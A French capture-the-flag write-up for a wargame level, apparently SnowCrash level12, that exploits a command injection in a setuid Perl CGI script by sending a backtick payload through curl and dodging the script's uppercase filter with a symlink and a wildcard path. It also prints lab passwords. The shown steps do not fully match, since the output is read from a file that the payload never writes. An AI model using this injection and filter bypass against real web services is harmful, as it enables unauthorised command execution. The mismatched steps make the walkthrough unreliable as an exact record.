# Level12

> login:password -> *`level12:fa6v5ateaw21peobuub8ipe6s`*
```
:~$ su level12
Password:fa6v5ateaw21peobuub8ipe6s
```
---

```
:~$ pwd
/home/user/level12
```

```
:~$ ls -la
...
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
...
```

Le Home contient un script perl :

```
#!/usr/bin/env perl
# localhost:4646 (ici indique qu'il écoute sur le port :4646)
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; (ici transforme le lowercase en uppercase)
  $xx =~ s/\s.*//; (ici supprime tout ce qui va suivre un espace)
  @output = `egrep "^$xx" /tmp/xd 2>&1`; (ici il execute le pametre en effectuant une substitution avant. C'est une faille)
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}
(ici print "." ou ".." en fonction du nombre de paramétres)

n(t(param("x"), param("y"))); (ici prends 2 paramétres x et y)
```

On remarque que le script est un serveur qui écoute sur le port `:4646` et utilise un `egrep`. On peux aussi voir que le script prends 2 paramétres `x` et `y`, et que le fichier passé  en `x` doit forcément être en masjuscule, car une regex passe cet argument en uppercase, tandis que l'argument `y` n'est juste pas utilisé.\
Je vais de ce fait créer un lien symbolique avec la commande getflag, en prenant soin de l'écrire en masjuscule :

```
:~$ ln -s /bin/getflag /tmp/GETFLAG

:~$ /*/GETFLAG (ici j'utilise une `*` pour éviter le passage du caractère en uppercase)
Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)
```

On peux voir que le lien permet bien d'exécuter la commande. Maintenant il faut faire en sorte qu'il soit lancé par le script pour en récupérer le résultat.







AAAAAAAAAAA

```
:~$ curl 'localhost:4646/?x=`/*/GETFLAG`'

:~$ cat /tmp/flag12
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr

```



Le flag nous permet de se connecter au level13
`level13:g1qKMiRpXf53AWhDaU7FEkczr`